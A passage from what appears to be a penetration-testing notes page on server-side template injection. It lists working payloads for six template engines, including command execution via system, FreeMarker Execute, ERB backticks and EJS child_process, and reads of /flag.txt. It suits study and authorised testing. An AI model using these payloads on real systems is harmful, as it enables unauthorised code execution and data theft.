+{{ request|attr(request.args.a) }}</code></pre><p>For the last example, append <code>&amp;a=application</code> to the same request. A filter that checks only one parameter may miss another. Hex escapes build the same attribute string inside a quoted template string; they do not defeat a sandbox&rsquo;s actual attribute policy. The <code>attr</code> filter looks up attributes; mapping keys still need subscription.</p>
+<h3 id="object-graph-route-when-helpers-are-absent">Object graph route when helpers are absent<a class="anchor" href="#object-graph-route-when-helpers-are-absent"></a></h3>
+<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{{ &#39;&#39;.__class__ }}
+{{ &#39;&#39;.__class__.__mro__ }}
+{{ &#39;&#39;.__class__.__mro__[1].__subclasses__() }}</code></pre><p>Inspect the list and identify the actual class before using it. Subclass indexes vary by Python build, imported modules and process state. A copied <code>__subclasses__()[396]</code> is not a portable payload. A subprocess class may not be imported at all. Stay with a simpler exposed function/global when available.</p>
+<h3 id="blind-or-hidden-result">Blind or hidden result<a class="anchor" href="#blind-or-hidden-result"></a></h3>
+<pre tabindex="0"><code class="language-jinja2" data-lang="jinja2">{% if 7*7 == 49 %}YES{% else %}NO{% endif %}
+{% if config.get(&#39;DEBUG&#39;) %}YES{% else %}NO{% endif %}</code></pre><p>A controlled marker is easier to reason about than a timeout. Inspect downstream email/PDF/export output if the preview only says “queued.”</p>
+<h2 id="4-twig--php">4. Twig / PHP<a class="anchor" href="#4-twig--php"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-twig" data-lang="twig"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{{</span><span style="color:#b48ead">7</span><span style="color:#81a1c1">*</span><span style="color:#b48ead">7</span><span style="color:#5e81ac;font-style:italic">}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{{</span><span style="color:#a3be8c">&#39;ab&#39;</span><span style="color:#81a1c1">|</span><span style="color:#88c0d0">upper</span><span style="color:#5e81ac;font-style:italic">}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{{</span>_self<span style="color:#5e81ac;font-style:italic">}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{{</span>constant<span style="color:#81a1c1">(</span><span style="color:#a3be8c">&#39;PHP_VERSION&#39;</span><span style="color:#81a1c1">)</span><span style="color:#5e81ac;font-style:italic">}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{%</span> <span style="color:#81a1c1;font-weight:bold">for</span> k<span style="color:#81a1c1">,</span>v <span style="color:#81a1c1;font-weight:bold">in</span> _context <span style="color:#5e81ac;font-style:italic">%}{{</span>k<span style="color:#5e81ac;font-style:italic">}}</span>:<span style="color:#5e81ac;font-style:italic">{{</span>v<span style="color:#5e81ac;font-style:italic">}}</span>;<span style="color:#5e81ac;font-style:italic">{%</span> <span style="color:#81a1c1;font-weight:bold">endfor</span> <span style="color:#5e81ac;font-style:italic">%}</span></span></span></code></pre></div><p><code>constant()</code> may be restricted or unavailable in a sandbox; exposed <code>_context</code> values and application services are more useful than guessing universal helpers.</p>
+<p>Historical or permissive Twig setups may accept PHP callable strings in sequence filters:</p>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-twig" data-lang="twig"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{{</span> <span style="color:#81a1c1">[</span><span style="color:#a3be8c">&#39;id&#39;</span><span style="color:#81a1c1">]|</span><span style="color:#88c0d0">filter</span><span style="color:#81a1c1">(</span><span style="color:#a3be8c">&#39;system&#39;</span><span style="color:#81a1c1">)|</span><span style="color:#88c0d0">join</span><span style="color:#81a1c1">(</span><span style="color:#a3be8c">&#39;,&#39;</span><span style="color:#81a1c1">)</span> <span style="color:#5e81ac;font-style:italic">}}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{{</span> <span style="color:#81a1c1">[</span><span style="color:#a3be8c">&#39;id&#39;</span><span style="color:#81a1c1">]|</span><span style="color:#88c0d0">map</span><span style="color:#81a1c1">(</span><span style="color:#a3be8c">&#39;system&#39;</span><span style="color:#81a1c1">)|</span><span style="color:#88c0d0">join</span><span style="color:#81a1c1">(</span><span style="color:#a3be8c">&#39;,&#39;</span><span style="color:#81a1c1">)</span> <span style="color:#5e81ac;font-style:italic">}}</span></span></span></code></pre></div><p>Treat these as <strong>legacy/configuration-dependent candidates</strong>, not universal Twig 3 payloads. Modern sandbox policy and versions can require closures, reject the callable, or restrict functions. A rejection identifies a constraint. Current documented arrow syntax, such as <code>{{[1,2]|map(v =&gt; v*2)|join(',')}}</code>, proves the filter is available; it does not prove arbitrary PHP execution.</p>
+<p>Old <code>_self.env.registerUndefinedFilterCallback(...)</code> recipes target historical Twig internals. Do not spend time on them unless source/version matches. For modern targets, inspect deliberately exposed app objects, template loaders, custom functions and extensions.</p>
+<h2 id="5-freemarker--java">5. FreeMarker / Java<a class="anchor" href="#5-freemarker--java"></a></h2>
+<pre tabindex="0"><code class="language-freemarker" data-lang="freemarker">${7*7}
+${&#34;ab&#34;?upper_case}
+${.version}
+&lt;#assign x=7&gt;${x*7}
+&lt;#list .data_model?keys as k&gt;${k} &lt;/#list&gt;</code></pre><p>Special variable access and model enumeration depend on wrapper/configuration. A hash-like model may expose keys, while another wrapper does not.</p>
+<p>With an unrestricted class resolver that allows the class:</p>
+<pre tabindex="0"><code class="language-freemarker" data-lang="freemarker">&lt;#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt;${ex(&#34;id&#34;)}
+&lt;#assign ex=&#34;freemarker.template.utility.Execute&#34;?new()&gt;${ex(&#34;cat /flag.txt&#34;)}</code></pre><p><code>?new</code> class resolution can deny <code>Execute</code> and other dangerous classes. <code>?api</code> additionally needs <code>api_builtin_enabled=true</code> <strong>and</strong> an object wrapper supporting API access. Seeing <code>${7*7}</code> succeed does not establish either condition. Inspect named exposed Java objects if <code>?new</code> is blocked. File includes normally resolve through a configured template loader, not unrestricted filesystem reads.</p>
+<h2 id="6-erb--ruby">6. ERB / Ruby<a class="anchor" href="#6-erb--ruby"></a></h2>
+<pre tabindex="0"><code class="language-erb" data-lang="erb">&lt;%= 7*7 %&gt;
+&lt;%= &#39;ab&#39;.upcase %&gt;
+&lt;%= RUBY_VERSION %&gt;
+&lt;%= self.class %&gt;
+&lt;%= Dir.pwd %&gt;
+&lt;%= Dir.entries(&#39;/&#39;) %&gt;
+&lt;%= File.read(&#39;/flag.txt&#39;) %&gt;
+&lt;%= `id` %&gt;</code></pre><p>These require actual ERB template-source control in a Ruby context that permits those constants/methods. An app rendering your input as a variable inside ERB does not compile the input again. HTML-escaped file output is still readable in source.</p>
+<h2 id="7-ejs--node">7. EJS / Node<a class="anchor" href="#7-ejs--node"></a></h2>
+<pre tabindex="0"><code class="language-ejs" data-lang="ejs">&lt;%= 7*7 %&gt;
+&lt;%= &#39;ab&#39;.toUpperCase() %&gt;
+&lt;%= typeof process %&gt;
+&lt;%= typeof require %&gt;
+&lt;%= Object.keys(locals).join(&#39;,&#39;) %&gt;</code></pre><p><code>locals</code> name and exposure depend on EJS options. If a CommonJS <code>require</code> binding is actually passed into the render context:</p>
+<pre tabindex="0"><code class="language-ejs" data-lang="ejs">&lt;%= require(&#39;fs&#39;).readdirSync(&#39;/&#39;).join(&#39;,&#39;) %&gt;
+&lt;%= require(&#39;fs&#39;).readFileSync(&#39;/flag.txt&#39;,&#39;utf8&#39;) %&gt;
+&lt;%= require(&#39;child_process&#39;).execSync(&#39;id&#39;).toString() %&gt;</code></pre><p><code>require</code> is not a universal template global. ESM applications and restricted render contexts can lack it. <code>process.mainModule.require(...)</code> is an old, environment-dependent route; <code>mainModule</code> may be absent. Use the actual bindings exposed by source. Ordinary EJS escaped/unescaped output tags do not evaluate user-supplied strings as template source.</p>
+<h2 id="8-smarty">8. Smarty<a class="anchor" href="#8-smarty"></a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#d8dee9;background-color:#2e3440;-moz-tab-size:2;-o-tab-size:2;tab-size:2;-webkit-text-size-adjust:none;"><code class="language-smarty" data-lang="smarty"><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{</span><span style="color:#b48ead">7</span><span style="color:#81a1c1">*</span><span style="color:#b48ead">7</span><span style="color:#5e81ac;font-style:italic">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{</span>$smarty.version<span style="color:#5e81ac;font-style:italic">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{</span>$smarty.template<span style="color:#5e81ac;font-style:italic">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{</span><span style="color:#88c0d0">assign</span> <span style="color:#8fbcbb">var</span><span style="color:#81a1c1">=</span><span style="color:#8fbcbb">x</span> <span style="color:#8fbcbb">value</span><span style="color:#81a1c1">=</span><span style="color:#b48ead">7</span><span style="color:#5e81ac;font-style:italic">}{</span>$x<span style="color:#81a1c1">*</span><span style="color:#b48ead">7</span><span style="color:#5e81ac;font-style:italic">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#5e81ac;font-style:italic">{</span><span style="color:#88c0d0">fetch</span> <span style="color:#8fbcbb">file</span><span style="color:#81a1c1">=</span><span style="color:#a3be8c">&#39;/flag.txt&#39;</span><span style="color:#5e81ac;font-style:italic">}</span></span></span></code></pre></div><p><code>fetch</code> needs an available plugin and policy allowing the path; security mode restricts accessible directories. PHP-function modifiers, <code>{php}</code> blocks and old object chains are <strong>not portable</strong> across Smarty generations. Use the reported version and security configuration. An include may interpret a template instead of returning raw file bytes.</p>
+<h2 id="9-if-the-payload-fails">9. If the payload fails<a class="anchor" href="#9-if-the-payload-fails"></a></h2>
+<table>
+  <thead>
+      <tr>
+          <th>Observation</th>
+          <th>Next action</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>Literal braces</td>
+          <td>Check raw bytes, render stage and whether input is template data</td>
+      </tr>
+      <tr>
+          <td>Only browser evaluates</td>
+          <td>Investigate client-side template/DOM flow</td>
+      </tr>
+      <tr>
+          <td>500 on every delimiter</td>
+          <td>Use paired arithmetic and inspect error names; malformed input alone proves little</td>
+      </tr>
+      <tr>
+          <td>Valid arithmetic, empty object</td>
+          <td>Try a defined constant/string before concluding sandbox</td>
+      </tr>
+      <tr>
+          <td><code>SecurityError</code> / denied class</td>
+          <td>Record policy; enumerate exposed safe data / source</td>
+      </tr>
+      <tr>
+          <td>Output escaped</td>
+          <td>View response source; HTML escaping does not stop server evaluation</td>
+      </tr>
+      <tr>
+          <td>File missing</td>
+          <td>Enumerate directory through the confirmed primitive; stop guessing filenames</td>
+      </tr>
+      <tr>
+          <td>URL stops at <code>#</code> or <code>&amp;</code></td>
+          <td>Encode for the transport; fragments are never sent to server</td>
+      </tr>
+  </tbody>
+</table>
+<h2 id="tool-workflow">Tool workflow<a class="anchor" href="#tool-workflow"></a></h2>
+<p>Use <a href="../../ajcbbc_allow_tools/burp_suite_community/">Burp Community Repeater</a> for paired manual requests. Keep the baseline in one tab and change one input in another. Browser-only behavior such as XSS, cookies and CORS still needs a real browser proof.</p>
+<h2 id="references">References<a class="anchor" href="#references"></a></h2>
+<p>Engine syntax and restrictions: <a href="https://jinja.palletsprojects.com/en/stable/sandbox/">Jinja sandbox</a>, <a href="https://twig.symfony.com/doc/3.x/filters/map.html">Twig map</a>, <a href="https://freemarker.apache.org/docs/ref_builtins_expert.html">FreeMarker expert builtins</a>, <a href="https://docs.ruby-lang.org/en/master/ERB.html">Ruby ERB</a>, <a href="https://ejs.co/">EJS documentation</a>, <a href="https://www.smarty.net/docs/en/language.function.fetch.tpl">Smarty fetch and security</a>. General workflow: <a href="https://portswigger.net/web-security/server-side-template-injection">PortSwigger SSTI</a>.</p>
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/web-expl/source-disclosure/" class="flex align-center">
+        <img src="/icons/backward.svg" class="book-icon" alt="Backward" />
+        <span>08 · Source / Backup Leaks</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/web-expl/nosqli/" class="flex align-center">
+        <span>NoSQL Injection · Operators &amp; Blind Reads</span>
+        <img src="/icons/forward.svg" class="book-icon" alt="Forward" />
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        <div class="field-footer"><span>offsec-n0t3 <span aria-hidden="true">//</span> keep your findings close.</span><a href="#field-content">BACK TO TOP ↑</a></div>
+
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay"></label>
+    </div>
+
+    
+  
+  <aside class="book-toc">
+    <div class="book-toc-content">
+      
+  <div class="nav-caption">ON THIS PAGE</div>
+
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-first-requests">1. First requests</a></li>
+    <li><a href="#2-identify-with-a-second-independent-signal">2. Identify with a second independent signal</a></li>
+    <li><a href="#3-jinja2--flask-inspect-before-executing">3. Jinja2 / Flask: inspect before executing</a>
+      <ul>
+        <li><a href="#attribute-syntax-and-narrow-string-filters">Attribute syntax and narrow string filters</a></li>
+        <li><a href="#object-graph-route-when-helpers-are-absent">Object graph route when helpers are absent</a></li>
+        <li><a href="#blind-or-hidden-result">Blind or hidden result</a></li>
+      </ul>
+    </li>
+    <li><a href="#4-twig--php">4. Twig / PHP</a></li>
+    <li><a href="#5-freemarker--java">5. FreeMarker / Java</a></li>
+    <li><a href="#6-erb--ruby">6. ERB / Ruby</a></li>
+    <li><a href="#7-ejs--node">7. EJS / Node</a></li>
+    <li><a href="#8-smarty">8. Smarty</a></li>
+    <li><a href="#9-if-the-payload-fails">9. If the payload fails</a></li>
+    <li><a href="#tool-workflow">Tool workflow</a></li>
+    <li><a href="#references">References</a></li>
+  </ul>
+</nav>
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </main>
+
+  <a class="skip-link" href="#field-content">Skip to notes</a>
+<div class="reading-progress" aria-hidden="true"></div>
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
